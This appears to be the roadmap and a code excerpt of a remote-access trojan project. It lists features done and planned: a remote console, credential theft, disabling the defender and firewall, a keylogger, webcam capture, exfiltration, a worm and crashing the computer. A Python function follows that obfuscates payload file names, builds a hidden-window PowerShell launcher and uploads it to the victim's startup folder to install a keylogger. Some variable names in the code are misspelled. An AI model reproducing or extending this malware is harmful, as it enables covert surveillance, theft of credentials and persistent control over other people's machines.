# Roadmap:
Target Build:
- [x] staging
- [x] remote access
- [x] config file builder [.? extension]

Attacker Build:
- [x] loop user input field
- [x] console build [python3]
- [x] update

Installers:
- [ ] listener option
- [ ] USB RubberDucky
- [ ] BashBunny
- [ ] shortcutting

Modules | Payloads:
- [x] remote console
- [ ] reconnaissance scan
	- web history
	- bookmarks
	- computer info
- [ ] escalation
	- windows account
	- web credentials
	- wifi credentials
- [ ] destroy defender
	- firewall
- [ ] keylogger
	- backspace detection
- [ ] screenshots
- [ ] webcam
- [ ] exfiltration
	- scp
- [ ] file upload
- [ ] worm
	- vbs special 
- [ ] custom desktop shortcuts
- [ ] adware
- [ ] killswitch
- [ ] break pc | bsod
- [ ] payload builder

Extraneous:	
- [ ] port forwarding
- [ ] vm detection
- [x] obfuscation
- [ ] exploit for non priv users


## shell script
```
[+] - confirmation
[-] - denied
[*] - pending
[~] - input
[!] - warning
[!!] - exception
[::] - source
[#(/#)] - numeric option
[@(/@)] - alphanumeric option
```

## keylogger function
```python
# keylogger
def keylogger(address, password, working, startup):
    # file paths
    controller = f"{local_path}/payloads/controller.cmd"
    keylogger = f"{local_path}/payloads/keylogger.ps1"
    scheduler = f"{local_path}/payloads/schedule.ps1"

    # obfuscated files
    obfuscated_controller = random_text() + ".cmd"
    obfuscated_keylogger = random_text() + ".ps1"
    obfuscated_scheduler = random_text() + ".ps1"

    # building controller
    with open(obfuscated_controller, "w") as f:
        f.write("@echo off")
        f.write(f"powershell Start-Process powershell.exe -windowstyle hidden \"{working_direcory}/\"")

    # file staging
    os.system(f"cp {controller} {local_path}/{obfuscated_controller}")
    os.system(f"cp {keylogger} {local_path}/{obfuscated_keylogger}")
    os.system(f"cp {scheduler} {local_path}/{obfuscated_scheduler}")

    # remote upload
    remote_upload(address, password, obfuscated_controller, startup_direcory) # controller
    remote_upload(address, password, obfuscated_keylogger, working_direcory) # keylogger
    remote_upload(address, password, obfuscated_scheduler, working_direcory) # scheduler
```